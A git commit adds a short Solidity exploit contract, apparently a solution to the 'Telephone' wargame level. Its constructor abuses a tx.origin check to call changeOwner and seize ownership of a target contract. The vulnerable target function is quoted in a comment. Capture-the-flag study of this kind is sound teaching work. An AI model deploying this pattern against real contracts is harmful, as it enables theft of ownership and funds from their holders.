4ecb8c4773274a2182012bb77bec00e472df1c7d
t4sk <tsk.nakamura@gmail.com>
2022-11-11 10:05:19 +0900

    telephone

---
+++ src/04-telephone.sol
@@ -0,0 +1,21 @@
+pragma solidity ^0.8;
+
+interface ITelephone {
+    function owner() external view returns(address);
+    function changeOwner(address) external;
+}
+
+contract Hack {
+    constructor(address _target) {
+        // tx.origin = msg.sender
+        // msg.sender = address(this)
+        ITelephone(_target).changeOwner(msg.sender);
+    }
+}
+/*
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+        owner = _owner;
+    }
+}
+*/
